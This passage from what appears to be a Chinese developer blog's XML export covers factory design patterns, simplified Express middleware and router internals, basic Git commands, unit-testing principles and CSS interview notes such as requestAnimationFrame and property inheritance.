简单工厂模式的缺点由于工厂类集中了所有产品创建逻辑，一旦不能正常工作，整个系统都要受到影响。使用简单工厂模式将会增加系统中类的个数，在一定程序上增加了系统的复杂度和理解难度。系统扩展困难，一旦添加新产品就不得不修改工厂逻辑，在产品类型较多时，有可能造成工厂逻辑过于复杂，不利于系统的扩展和维护。简单工厂模式由于使用了静态工厂方法，造成工厂角色无法形成基于继承的等级结构。 工厂方法模式工厂方法模式包含如下角色：Product：抽象产品ConcreteProduct：具体产品Factory：抽象工厂ConcreteFactory：具体工厂]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Fexpress%2F</url>
    <content type="text"><![CDATA[前言 express构造的是Http.createServer的回调函数express是一个基于NodeJS的框架，先来看下如果不使用框架要创建一个最简单的web应用应该是怎么样 12345const http = require('http');const server = http.createServer(function(req, res)&#123; res.end('hello word!')&#125;);server.listen(8000); 实际上express是一个函数，运行后可以构造出上面代码中http.createServer的回调函数，express做的一切文章都是在这个回调函数上。来看下express3.x的源码express.js 12345678910111213141516171819202122232425262728293031//========== 你的应用 app.js ==================const http = require('http')const app = express()app.get('/', (req, res) =&gt; res.send('Hello World!'))const server = http.createServer(app)server.listen(8000);//========== express.js =============var connect = require('connect')function createApplication() &#123; var app = connect(); utils.merge(app, proto); app.request = &#123; __proto__: req &#125;; app.response = &#123; __proto__: res &#125;; app.init(); return app;&#125;module.exports = createApplication;//=========== express依赖的connect.js==============function createServer() &#123; function app(req, res, next)&#123; app.handle(req, res, next); &#125; // ... 省略 return app;&#125;module.exports = createServer; connect.js的具体内容先不关心，后面会重点介绍。可以看出connect是一个函数，运行返回一个app，app是一个形如function(req, res , next){ … } 的函数。express的createApplication返回即是此app，用于http.createServer的回调。并在这个函数上混入的许多能力，如req、res的处理、模板引擎、静态文件服务、router的能力。 用比较简单的伪代码表示如下 12345678910111213141516171819202122const app = express();// nodejs启动时，app函数内部被express增加了能力，如中间件的调用 app.use(middleware)； // 中间件 app.use(router)； // 路由 app.engine('ejs'); // 模板引擎 app.statifc('public') // 静态文件服务 // ... 还有代理以及其他许多属性与方法const server = http.createServer( function app(req, res)&#123; // 此app函数即为express所构造 // http请求时，req， res被混入许多属性与方法，做了很多处理 // 串行匹配运行按顺序注册的各注册的中间件如： // 1、日志、cookie、bodyparser等开发者自己注册的中间件 // 2、router中间件 // 3、静态文件服务 // 4、模板引擎处理 // 经过匹配的中间件处理后输出返回 &#125;);server.listen(8000); 上面的1、2、3、4顺序即为开发者注册时的顺序（故我们平时在开发时express注册中间件时是有先后顺序的）。express最主管理与运行中间件的能力，接下来深入内部看看connect这个中间件机制是怎么实现的。 最为核心的中间件框架123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//connect.js 的简要内容function createServer()&#123; // app是用于http.createServer的回调函数 function app(req, res, next)&#123; // 运行时调用handle函数 app.handle(req, res, next); &#125; mixin(app, proto, false); // 初始化一个stack数组 app.stack = []; return app;&#125;// use调用时往app的stack数组中push一个对象（中间件），标识path与回调函数proto.use = function(route, fn)&#123; var path = route, handle = fn; //... 省略其他 this.stack.push(&#123; route: path, handle &#125;);&#125;;// handle方法，串行取出stack数组中的中间件，逐个运行proto.handle = function(req, res, out)&#123; var index = 0; var stack = this.stack; var done = out || finalhandler(req, res, &#123; onerror: logerror &#125;); // 遍历stack，逐个取出中间件运行 function next(err)&#123; var layer = stack[index++]; // 遍历完成为止 if(layer === undefined)&#123; return done(); &#125; var route = pathFormat(layer.route); var pathname = pathFormat(urlParser(req.url).pathname || '/'); // 匹配中间件，不匹配的不运行 if(route !== '' &amp;&amp; pathname !== route)&#123; next(err); return; &#125; // 调用中间件 call(layer.handle, err, req, res, next); &#125; next();&#125;; 不难看出，app.use中间件时，只是把它放入一个数组中。当http请求时，app会从数组中逐个取出，进行匹配过滤，逐个运行。遍历完成后，运行finalhandler，结束一个http请求。可以从http请求的角度思考，一次请求它经历经历了多少东西。express的这个中间件架构就是负责管理与调用这些注册的中间件。中间件顺序执行，通过next来继续下一个，一旦没有继续next，则流程结束。 接下来提一下异步编程的串行控制，加强理解； 异步串行流程控制为了用串行化流程控制让几个异步任务按顺序执行，需要先把这些任务按预期的执行顺序放 到一个数组中。如图，所示，这个数组将起到队列的作用:完成一个任务后按顺序从数组中取 出下一个 数组中的每个任务都是一个函数。任务完成后应该调用一个处理器函数，告诉它错误状态和 结果。如果有错误，处理器函数会终止执行;如果没有错误，处理器就从队列中取出下一个任务 执行它 下面是一个简单实现方案： 1234567891011121314151617181920212223242526// 数组var tasks = [ function A()&#123; //... next(); &#125;, function B()&#123; //... next() &#125;, function C()&#123; //... next() &#125; //...];function next(err, result)&#123; if(err) throw err; var currentTask = tasks.shift(); if(currentTask) currentTask(result) next();&#125;// 首次主动调用next(); 异步串行控制方案除了上面的这种以外，还可以用es6的promise的then链、async/await、yeild、社区工具等； 可以看到代码确实谈不上高级😂，串行导致的性能谈不上优秀，但是得益于此它足够简单易用。到此可以发现express的中间件架构就是一个中间件的的管理与数组遍历运行，这个方案就让社区形形色色各种各样的中间件很好的添加express能力，这点很简单也很重要，因为后续的路由、静态文件服务、代理等都是中间件，都在这个框架内运行。 Router是一个内置在app函数上的中间件来看下简化后的router.js 1234567891011121314151617181920212223242526272829//express创建时运行app.init = function()&#123; // ... 省略其它代码 this._router = new Router(); this.usedRouter = false; // app调用router时初始化router中间件 Object.defineProperty(this, 'router', &#123; configurable : true, enumerable : true, get: function () &#123; this.usedRouter = true; return this._router.middlewareInit.bind(this._router); &#125; &#125;)&#125;;// methods是一个数组，['get','post','put','delete',...]methods.forEach(method =&gt; &#123; app[method] = function (path) &#123; // 如果首次调用则放入路由中间价 if(!this.usedRouter)&#123; this.use(this.router); &#125; // 加入stack this._router.addRoute(method, path, Array.prototype.slice.call(arguments, 1)) &#125;&#125;); 上面的usedRouter是个开关，未开启则不加入router中间件，因为应用理论上也是可能不用到router的。当app[method] 如app.get(‘/user’, fn)调用后，则触发this.use(this.router) 使用router中间件，同时把usedRouter设置为true。之后往router对象中加入fn回调函数。 router实际上也是一个异步串行流程控制，简化版的代码如下 12345678910111213141516171819202122232425262728293031323334353637Router.prototype.addRoute = function(method, path, handles)&#123; let layer = &#123; path, handles &#125;; this.map[method] = this.map[method] || []; this.map[method].push(layer);&#125;;Router.prototype.middlewareInit = function(req, res, out)&#123; let index = 0; let method = req.method.toLowerCase() || 'get'; let stack = this.map[method]; function next(err) &#123; let layer = stack[index++]; let hasError = Boolean(err); // 如果没有了则结束中间件，走下一个中间件 if(!layer)&#123; return hasError ? out(err) : out(); &#125; let route = utils.pathFormat(layer.path); let pathname = utils.pathFormat(urlParser(req.url).pathname || '/'); // 进行过滤 if(route!== '' &amp;&amp; route !== pathname)&#123; return next(err); &#125; executeHandles(layer.handles, err, req, res, next); &#125; next();&#125;; router跟connect非常类似，上述理解了connect，router就很清晰了。一图以蔽之： 实际上router还有细分，某个router还是可以继续做类似的串行流程控制；与中间件相同，每个router一旦停止了next，流程就结束了。 request经过router可以请求一个数据，或者一个网页；网页的话是怎么返回的呢，接下来看下view的render； 视图-模板引擎模板引擎是根据对模板结合data进行运行处理，生产real html；这跟React、Vue、模板引擎是类似的。模板引擎不是express 实现的，实际上express仅仅只是做了调用；这里有个通用的支持各种模板引擎的模块consolidate.js 1234567var cons = require('consolidate') , name = 'swig';cons[name]('views/page.html', &#123; user: 'tobi' &#125;, function(err, html)&#123; if (err) throw err; console.log(html);&#125;); express要做的只是配置与调用； 1234567891011// express设置属性app.set = function(key, value)&#123; if(this.settings.hasOwnProperty(key))&#123; return this.settings[key]; &#125; this.settings[key] = value;&#125;;app.engine = function(engine)&#123; this.settings['engine'] = engine;&#125;; 通过这两个函数设置views视图所在的路径、模板引擎类型，之后express就可以结合router提供的render page，data，render callback的数据进行视图渲染 1234567891011121314151617181920212223242526272829303132333435363738app.render = function (name, options, fn) &#123; let cacheTemplate = this.cache[name]; let view = cacheTemplate || new View(name, &#123; root: process.cwd(), viewPath: this.settings['views'], engine: this.settings['engine'] &#125;); if(!cacheTemplate &amp;&amp; this.settings['view cache'])&#123; this.cache[name] = view; &#125; view.render(options, fn);&#125;;// View.js 简化function View(page, config)&#123; console.log('view 初始化'); this.engine = config.engine || 'ejs'; this.templatePath = path.join(config.root, config.viewPath, page); this.lookup();&#125;//检测模板是否存在View.prototype.lookup = function()&#123; if(!fs.existsSync(this.templatePath))&#123; console.log('模板没有找到'); throw new Error('模板没有找到'); &#125;&#125;;View.prototype.render = function (options, fn) &#123; let templatePath= this.templatePath; // 调用模板引擎完成渲染 return cons[this.engine](templatePath, options, fn);&#125;; 为了性能考虑还做了cache；关于模板引擎，实际上很简单，读者可以自定一个模板引擎规则。 静态文件服务静态文件服务也是一个中间件，express做的事情也仅仅是引用。require一个serve-static，内置在app函数上。 123app.static = function (dir) &#123; this.use(serveStatic(process.cwd() + '/' + dir), &#123;&#125;);&#125;; 当调用app.static时就会把静态文件服务中间件放入stack中，这里与express调用方式稍有不同，因为笔者觉得这么写更好更简单。 简单实现：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/**仿照express实现中间件的功能 Created by haoxin on 2018/7/9.*/var http = require(&apos;http&apos;); var express = () =&gt; &#123; var funcs = []; // 待执行的函数数组 var app = (req, res) =&gt; &#123; var i = 0; var next = () =&gt; &#123; var task = funcs[i++]; // 取出函数数组里的下一个函数 if (!task) &#123; // 如果函数不存在,return return; &#125; task(req, res, next); // 否则,执行下一个函数 &#125; next(); &#125; /** * use方法就是把函数添加到函数数组中 * @param task */ app.use = (task) =&gt; &#123; funcs.push(task); &#125; return app; // 返回实例 &#125;// 下面是测试casevar app = express();http.createServer(app).listen(&apos;3000&apos;, () =&gt; &#123; console.log(&apos;listening 3000....&apos;);&#125;);const middlewareA = (req, res, next) =&gt; &#123; if(req.url!==&quot;/favicon.ico&quot;) &#123; //防止重复请求 console.log(&apos;middlewareA before next()&apos;); next(); console.log(&apos;middlewareA after next()&apos;); &#125; res.end();&#125;const middlewareB = (req, res, next) =&gt; &#123; console.log(&apos;middlewareB before next()&apos;); next(); console.log(&apos;middlewareB after next()&apos;);&#125;const middlewareC = (req, res, next) =&gt; &#123; console.log(&apos;middlewareC before next()&apos;); next(); console.log(&apos;middlewareC after next()&apos;);&#125;app.use(middlewareA);app.use(middlewareB);app.use(middlewareC); https://blog.csdn.net/ppx2017/article/details/80967690 https://zhuanlan.zhihu.com/p/56947560]]></content>
  </entry>
  <entry>
    <title><![CDATA[Git入门]]></title>
    <url>%2F2017%2F12%2F16%2Fgit%2F</url>
    <content type="text"><![CDATA[前言简单记录Git用法以做记录 关于版本控制版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。 本地版本控制系统文件夹备份法。复制整个项目目录来保存不同的版本，或许还会改名加上备份时间以示区别。 其中最流行的一种叫做 RCS，现今许多计算机系统上都还看得到它的踪影。 甚至在流行的 Mac OS X 系统上安装了开发者工具包之后，也可以使用 rcs 命令。 它的工作原理是在硬盘上保存补丁集（补丁是指文件修订前后的变化）；通过应用所有的补丁，可以重新计算出各个版本的文件内容。 集中化的版本控制系统（Centralized Version Control Systems）使用一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。 这类系统，常见的有 CVS、Subversion 以及 Perforce 等，优点是有完善的权限系统，以及统一的服务端，适合商业软件的开发。缺点是如果出现中央服务器的单点故障，会有所有人无法工作甚至丢失文件的风险。 分布式版本控制系统(Distributed Version Control System)客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。 这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。 在这类系统中，像 Git、Mercurial、Bazaar、BitKeeper 以及 Darcs 等，它们相当于把集中式版本控制系统的服务端和客户端都交给参与开发的客户端来保管，只有需要不同开发者合并代码时，才需要一个中转站来完成。 集成管理者工作流Git 允许多个远程仓库存在，使得这样一种工作流成为可能：每个开发者拥有自己仓库的写权限和其他所有人仓库的读权限。 这种情形下通常会有个代表`‘官方’’项目的权威的仓库。 要为这个项目做贡献，你需要从该项目克隆出一个自己的公开仓库，然后将自己的修改推送上去。 接着你可以请求官方仓库的维护者拉取更新合并到主项目。 维护者可以将你的仓库作为远程仓库添加进来，在本地测试你的变更，将其合并入他们的分支并推送回官方仓库。 这一流程的工作方式如下所示 项目维护者推送到主仓库。 贡献者克隆此仓库，做出修改。 贡献者将数据推送到自己的公开仓库。 贡献者给维护者发送邮件，请求拉取自己的更新。 维护者在自己本地的仓库中，将贡献者的仓库加为远程仓库并合并修改。 维护者将合并后的修改推送到主仓库。 什么是GitGit是目前世界上最先进的分布式版本控制系统。最初由Linus Torvalds编写，用作Linux内核代码的管理。 直接记录快照，而非差异比较 Git 对待数据更像是一个 快照流。这是 Git 与几乎所有其它版本控制系统的重要区别。 近乎所有操作都是本地执行 Git 保证完整性 Git 中所有数据在存储前都计算校验和，然后以校验和来引用。 这意味着不可能在 Git 不知情时更改任何文件内容或目录内容。 这个功能建构在 Git 底层，是构成 Git 哲学不可或缺的部分。 若你在传送过程中丢失信息或损坏文件，Git 就能发现。Git 用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样： 24b9da6552252987aa493b52f8696cd6d3b00373 Git 中使用这种哈希值的情况很多，你将经常看到这种哈希值。 实际上，Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。 Git 一般只添加数据 所有Git 操作，几乎只往 Git 数据库中增加数据。以删除数据为例，删除一个文件只会是这次提交的版本中没有这个文件的快照，不会删除前几个版本中的这个文件。 三种状态 已提交（committed）、已修改（modified）和已暂存（staged） 什么是githubgithub是一个用git做版本控制系统的项目托管平台。 github上常见用语 Version Control（版本控制）: 任何一个能够让你了解文件的历史，以及该文件的发展进程的系统。 Git：一个版本控制程序，通过对变更进行注释，以创建一个易于遍历的系统历史。Commit（提交）：在指定时间点对系统差异进行的注释 “快照”。 Local（本地）：指任意时刻工作时正在使用的电脑。 Remote（远程）： 指某个联网的位置。 Repository (仓库，简称 repo)：配置了Git超级权限的特定文件夹，包含了你的项目或系统相关的所有文件。 Github：获取本地提交历史记录，并进行远程存储，以便你可以从任何计算机访问这些记录。 Pushing（推送）：取得本地Git提交（以及相关的所有工作），然后将其上传到在线Github。 Pulling（拉取）：从在线的Github上获取最新的提交记录，然后合并到本地电脑上。 Master (branch)：主分支，提交历史 “树”的 “树干”，包含所有已审核的内容/代码。 Feature branch（功能分支/特性分支）：一个基于主分支的独立的位置，在再次并入到主分支之前，你可以在这里安全地写工作中的新任务。 Pull Request（发布请求）：一个 Github 工具，允许用户轻松地查看某功能分支的更改 （the difference或 “diff”），同时允许用户在该分支合并到主分支之前对其进行讨论和调整。 Merging（合并）：该操作指获取功能分支的提交，加入到主分支提交历史的顶部。 Checking out（切换）：该操作指从一个分支切换到另一个分支。 一、基本操作1.设置用户信息 $ git config –global user.name “用户名” $ git config –global user.email “用户邮箱” 当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改： 再次强调，如果使用了 –global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 –global 选项的命令来配置。 很多 GUI 工具都会在第一次运行时帮助你配置这些信息。 检查配置信息如果想要检查你的配置，可以使用 git config –list 命令来列出所有 Git 当时能找到的配置。 $ git config –listuser.name=John Doeuser.email=johndoe@example.comcolor.status=autocolor.branch=autocolor.interactive=autocolor.diff=auto… 你可能会看到重复的变量名，因为 Git 会从不同的文件中读取同一个配置（例如：/etc/gitconfig 与 ~/.gitconfig）。 这种情况下，Git 会使用它找到的每一个变量的最后一个配置。 你可以通过输入 git config ： 来检查 Git 的某一项配置 $ git config user.nameJohn Doe 2.建库 $ git init 3.提交 $ git add 文件名 文件名 文件名 —&gt;从工作区提交文件到暂存区 $ git commit -m “更改说明” —&gt;从暂存区提交修改到版本库 4.查看 $ git status —&gt;查看仓库状态 $ git diff 文件名 —&gt;查看修改内容 $ git log —&gt;查看提交日志 查看日志具体信息[https://git-scm.com/book/zh/v2/Git-%E5%9F%BA%E7%A1%80-%E6%9F%A5%E7%9C%8B%E6%8F%90%E4%BA%A4%E5%8E%86%E5%8F%B2] $ git reflog —&gt;查看命令日志 5.回退 $ git reset –hard HEAD^ —&gt;回到上次修改 $ git reset –hard commit_id —&gt;回到任意版本(提交码取前面7位就够了) 6.撤销 $ git checkout –文件名 —&gt;把版本库中的文件替换当前文件，撤销所有未add修改 $ git reset HEAD 文件名 —&gt;把上一次add撤销 7.删除 $ git rm 文件名 —&gt;从版本库中删除文件 $ git commit -m “更改说明” —&gt;删除也是需要提交的修改 $ git checkout –文件名 —&gt;把版本库中的文件替换当前文件，误删恢复 8.移动 git mv file_from file_to 二、标签先切换到需要打标签的分支上 $ git tag 标签名字 查看所有标签 $ git tag 给历史提交打标签 $ git tag 标签名字 commit_id 显示标签分支的信息 $ git show 标签名字 还可以通过-s用私钥签名一个标签： $ git tag -s v0.2 -m “signed version 0.2 released” fec145a 如果标签打错了，也可以删除 $ git tag -d 标签名字 因为创建的标签都只存储在本地，不会自动推送到远程。如果要推送某个标签到远程，使用命令 $ git push origin 标签名 一次性推送全部尚未推送到远程的本地标签 $ git push origin –tags 三、远程仓库1. 创建SSH Key $ ssh-keygen -t rsa -C “用户邮箱” 可在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。 2. 绑定GitHub登陆GitHub，打开“Account settings”，“SSH Keys”页面：然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容。 3. 绑定库在GitHub上创建一个新库之后，本地用git上传内容 $ git remote add origin git@github.com:GitHub用户名/库名.git 添加上游 $git remote add upstream https://github.com/GitHub用户名/库名.git 查看远程库的信息 $ git remote -v 4.推送本地库内容把本地库的内容推送到远程，用git push命令把当前分支master推送到远程。 $ git push -u origin master 由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。推送成功后，可以立刻在GitHub页面中看到远程库的内容已经和本地一模一样。 5.克隆远程库内容 $ git clone git@github.com:GitHub用户名/库名.git (文件名) 6.抓取远程库内容 $ git fetch 这个命令会访问远程仓库，从中拉取所有你还没有的数据。 执行完成后，你将会拥有那个远程仓库中所有分支的引用，可以随时合并或查看。 如果你使用 clone 命令克隆了一个仓库，命令会自动将其添加为远程仓库并默认以 “origin” 为简写。 所以，git fetch origin 会抓取克隆（或上一次抓取）后新推送的所有工作。 必须注意 git fetch 命令会将数据拉取到你的本地仓库 - 它并不会自动合并或修改你当前的工作。 当准备好时你必须手动将其合并入你的工作。 四、分支管理master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点 当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：首先，我们创建dev分支，然后切换到dev分支： $ git checkout -b dev 命令加上-b参数表示创建并切换，相当于以下两条命令： $ git branch dev $ git checkout dev 查看所有分支(当前分支前面会标一个*号) $ git branch 切换回master分支： $ git checkout master 把dev分支的工作成果合并到当前分支上： $ git merge -m “合并说明” dev 删除dev分支 $ git branch -d dev 查看分支合并图 $ git log –graph 以图形化的方式展现提交的日志 $gitk 暂时分支（当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场。） $ git stash —&gt;创建暂时分支保存当前工作区内容 $ git stash apply —&gt;恢复暂时分支 $ git stash drop —&gt;删除暂时分支 $ git stash pop —&gt;恢复并删除暂时分支 $ git stash list —&gt;查看所有暂时分支 参考资料http://blog.jobbole.com/111187/https://zhuanlan.zhihu.com/p/45724857]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2FUnitTesting%2F</url>
    <content type="text"><![CDATA[前言 单元测试定义单元测试（Unit Testing），是指对软件中的最小可测试单元进行检查和验证。 特点1、它是一种验证行为 程序中的每一项功能都是测试来验证它的正确性。它为以后的开发提供支援。就算是开发后期，我们也可以轻松的增加功能或更改程序结构，而不用担心这个过程中会破坏重要的东西。而且它为代码的重构提供了保障。这样，我们就可以更自由的对程序进行改进。 2、它是一种设计行为 编写单元测试将使我们从调用者观察、思考。特别是先写测试（Test First），迫使我们把程序设计成易于调用和可测试的，即迫使我们解除软件中的耦合。 3、它是一种编写文档的行为 单元测试是一种无价的文档，它是展示函数或类如何使用的最佳文档。这份文档是可编译、可运行的，并且它保持最新，永远与代码同步。 4、它具有回归性 自动化的单元测试避免了代码出现回归，编写完成之后，可以随时随地的快速运行测试。 断言（assert）是编程术语，表示为一些布尔表达式，程序员相信在程序中的某个特定点该表达式值为真，可以在任何时候启用和禁用断言验证，因此可以在测试时启用断言而在部署时禁用断言。 BDD: Behavior-Driven Development (行为驱动开发)TDD: Test-Driven Development (测试驱动开发)ATDD: Acceptance Test Driven Development(验收测试驱动开发) 用例设计任何一个单元测试都应该包含： 正常输入 离散覆盖参数值域 边界输入 空值验证 零值验证 最大值验证 非法输入 入参数据类型非法 内存溢出验证 幂等 对于单元测试来说，保证其幂等性非常重要，幂等就是在相同输入的前提下，其输出结果不随时间而改变。 所以，我们可以看到，对于函数式编程语言来说，写单元测试则是非常容易的事情，因为在函数式范式中，我们的函数都是纯函数，在范式层面上就已经约束了开发者写出幂等的程序，那么，在javascript领域，我们想要写出质量更高，对测试友好的代码的话，则需要尽可能的写出各种纯函数，从而保证幂等性。 对于前端而言，其实还包含UI界面的幂等，如何更加高效的保证界面幂等，我们是可以借助jest的快照能力实现html结构级别的幂等验证或者通过gemini的离线截图能力来实现像素级的幂等验证。 Mock Mock数据，在编写单元测试用例的过程中，构造Mock数据是非常重要的实现手段，因为构造数据就是我们在构造输入的过程，比如正常输入/边界输入/非法输入 Mock环境，对于前端自动化测试而言，我们的环境Mock，往往是通过jsdom之类的库实现环境mock，保证离线场景下可以验证依赖浏览器API的程序逻辑 Mock事件，对于离线场景来说人机交互事件是不会有真实人类参与的，所以，我们需要Mock人机交互事件，帮助程序逻辑实现UI界面的交互功能性测试，在React中，是可以通过enzyme来实现Mock事件 Mock模块/第三方包，有些场景我们的程序依赖了某些第三方包，但是第三方包会引入副作用，比如axios，如果被测试的程序使用了该模块，它会走真实的发请求逻辑，这样还需要开一个mock请求服务，如果有一个模块拦截Mock能力，我们就不需要再开一个mock请求服务了，恰好jest提供了模块mock的能力，对于这类问题便可以轻松解决。 Mock函数/类，在Javascript语言中，函数的入参同样也可以是函数(匿名函数)，这恰好是Js最灵活的地方，但是如果参数是函数，则会使得测试用例的编写难度大大提升，我们很难知道入参函数的调用情况，所以，如果我们可以跟踪入参函数调用情况，就能很轻松的验证函数式编程范式下的程序逻辑，恰好jest提供了一个函数Mock能力，可以帮助用户快速Mock一个可以跟踪其调用情况的匿名函数。同样，对于类也是，jest提供了mock类的能力，帮助用户跟踪一个类实例的使用过程。 白盒覆盖 白盒覆盖就是测试用例要尽可能的覆盖程序内部的所有分支语句，从而整体性的保证代码质量。 我们都知道，覆盖率是衡量单元测试质量的核心指标，但是，对于TDD而言，我们肯定不可能做到一开始就达到100%的覆盖率，所以，正常的单元测试用例，往往是先从黑盒用例来写，也就是程序对外暴露的API层面的测试，前期先将这部分的单测覆盖全，后期，我们在bugfix或者feature addtion的过程中可以逐步增加测试用例，最终逐步达到80%以上的覆盖率即可满足白盒覆盖的效果。 单测定级 根据我们前面所述的白盒覆盖，覆盖率是一个非常客观的指标，但是覆盖率对于开发者的认知模型而言是不够清晰结构化的，所以，我们还需要对覆盖率再做一次结构化定级，方便开发者一步步完善单元测试，下面让我们来枚举一下所有的单测级别： Level1：正常流程可用，即一个函数在输入正确的参数时，会有正确的输出 Level2：异常流程可抛出逻辑异常，即输入参数有误时，不能抛出系统异常，而是用自己定义的逻辑异常通知上层调用代码其错误之处 Level3：极端情况和边界数据可用，对输入参数的边界情况也要单独测试，确保输出是正确有效的 Level4：所有分支、循环的逻辑走通，不能有任何流程是测试不到的 Level5：输出数据的所有字段验证，对有复杂数据结构的输出，确保每个字段都是正确的 示例https://zhuanlan.zhihu.com/p/55887740 https://zhuanlan.zhihu.com/p/55960017]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_CSS%2F</url>
    <content type="text"><![CDATA[前言 tanslateZ可以利用gpu加速 这个问题是因为使用transform和opacity做CSS动画的时候，会将元素提升为一个复合层；而使用js操作css属性做动画时，必须使用translateZ或will-change才能将元素强行提升至一个复合层。 元素本身使用transform和opacity做CSS动画的时候，会提前告诉GPU动画如何开始和结束及所需要的指令；所以会创建一个复合层（渲染层），并把页面所有的复合层发送给GPU；作为图像缓存，然后动画的发生仅仅是复合层间相对移动。 而使用js做动画，js必须在动画的每一帧计算元素的状态；发送给GPU，但不会将元素提升至一个复合层；所以想让元素提升至一个复合层，必须使用translateZ或will-change: transform, opacity。 window.requestAnimationFrame() 告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行 显示器也会以每秒60次的频率正在不断的更新屏幕上的图像**16.7ms**(1000/60≈16.7 与setTimeout相比，requestAnimationFrame最大的优势是由系统来决定回调函数的执行时机。具体一点讲，如果屏幕刷新率是60Hz,那么回调函数就每16.7ms被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，requestAnimationFrame的步伐跟着系统的刷新步伐走。它能保证回调函数在屏幕每一次的刷新间隔中只被执行一次，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。 123456789101112var progress = 0;//回调函数function render() &#123; progress += 1; //修改图像的位置 if (progress &lt; 100) &#123; //在动画没有结束前，递归渲染 window.requestAnimationFrame(render); &#125;&#125;//第一帧渲染window.requestAnimationFrame(render); CPU节能：使用setTimeout实现的动画，当页面被隐藏或最小化时，setTimeout 仍然在后台执行动画任务，由于此时页面处于不可见或不可用状态，刷新动画是没有意义的，完全是浪费CPU资源。而requestAnimationFrame则完全不同，当页面处理未激活的状态下，该页面的屏幕刷新任务也会被系统暂停，因此跟着系统步伐走的requestAnimationFrame也会停止渲染，当页面被激活时，动画就从上次停留的地方继续执行，有效节省了CPU开销。 函数节流：在高频率事件(resize,scroll等)中，为了防止在一个刷新间隔内发生多次函数执行，使用requestAnimationFrame可保证每个刷新间隔内，函数只被执行一次，这样既能保证流畅性，也能更好的节省函数执行的开销。一个刷新间隔内函数执行多次时没有意义的，因为显示器每16.7ms刷新一次，多次绘制并不会在屏幕上体现出来。 12345678var dis =0;function animation()&#123; requestAnimationFrame(function()&#123; div.style.left = ++dis; if(disx&lt;50) animation(); &#125;) &#125;animation(); https://blog.csdn.net/vhwfr2u02q/article/details/79492303伪类 :active :any-link :blank :checked :current :default :defined :dir() :disabled :drop :empty :enabled :first :first-child :first-of-type :fullscreen :future :focus :focus-visible :focus-within :has() :host :host()) :host-context()) :hover :indeterminate :in-range :invalid :is() :lang() :last-child :last-of-type :left :link :local-link :not() :nth-child() :nth-col() :nth-last-child() :nth-last-col() :nth-last-of-type() :nth-of-type() :only-child :only-of-type :optional :out-of-range :past :placeholder-shown :read-only :read-write :required :right :root :scope :target :target-within :user-invalid :valid :visited :where() 内联元素 1 a – 锚点 2 abbr – 缩写 3 acronym – 首字 4 b – 粗体(不推荐) 5 bdo – bidi override 6 big – 大字体 7 br – 换行 8 cite – 引用 9 code – 计算机代码(在引用源码的时候需要) 10 dfn – 定义字段 11 em – 强调 12 font – 字体设定(不推荐) 13 i– 斜体 14 img – 图片 15 input – 输入框 16 kbd – 定义键盘文本 17 label – 表格标签 18 q – 短引用 19 s – 中划线(不推荐) 20 samp – 定义范例计算机代码 21 select – 项目选择 22 small – 小字体文本 23 span – 常用内联容器，定义文本内区块 24 strike – 中划线 25 strong – 粗体强调 26 sub – 下标 27 sup – 上标 28 textarea– 多行文本输入框 29 tt – 电传文本 30 u – 下划线 31 var – 定义变量 css可以继承的属性和不可继承的属性2018.07.01 16:03:12字数 169阅读 677 不可继承的：display、margin、border、padding、background、height、min-height、max- height、width、min-width、max-width、overflow、position、left、right、top、 bottom、z-index、float、clear、table-layout、vertical-align、page-break-after、 page-bread-before和unicode-bidi 所有元素可继承：visibility和cursor 内联元素可继承：letter-spacing、word-spacing、white-space、line-height、color、font、 font-family、font-size、font-style、font-variant、font-weight、text- decoration、text-transform、direction 块状元素可继承：text-indent和text-align 列表元素可继承：list-style、list-style-type、list-style-position、list-style-image 表格元素可继承：border-collapse 0人点赞 日记本 transformposition display inline- flex 垂直居中 https://segmentfault.com/a/1190000016389031 123456789&lt;div class=&quot;red blue&quot;&gt;123&lt;/div&gt;&lt;div class=&quot;blue red&quot;&gt;123&lt;/div&gt;.red &#123; color: red&#125;.blue &#123; color: blue&#125; 两蓝 权重一样，按照声明顺序，后声明的优先。 CSS单位 单位 描述 % 百分比 in 英寸 cm 厘米 mm 毫米 em 1em 等于当前的字体尺寸。2em 